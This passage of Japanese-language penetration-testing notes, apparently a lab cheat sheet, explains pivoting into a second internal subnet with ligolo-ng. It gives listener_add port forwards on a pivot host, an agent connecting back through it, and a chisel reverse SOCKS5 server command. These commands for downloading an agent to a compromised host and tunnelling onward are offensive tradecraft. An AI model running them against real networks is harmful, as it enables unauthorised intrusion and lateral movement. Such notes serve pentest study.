...
172.16.5.0/24 とのセッションを既に確立できているとして、それをPivotとして 172.16.6.0/24 にもトンネリングを広げたいとする。

Kali <-> Pivot(172.16.5.15) <-> Victim(172.16.6.35)

#### agent を Victim にアップロード

Victim -> Pivot 8080 ポートの通信を、Kali に転送する。VictimからKaliのHTTPサーバーから agent をダウンロードできるようになる。

```sh
listener_add --addr 172.16.5.15:8080 --to 0.0.0.0:8080
```

#### ligolo セッション確立

Victim -> Pivot 11601 ポートの通信を、Kali に転送する。

```sh
listener_add --addr 172.16.5.15:11601 --to 0.0.0.0:11601
```

```sh
./agent -ignore-cert -connect 172.16.5.15:11601
```
...
```sh
./chisel server -p LISTEN_PORT --reverse --socks5 &
```
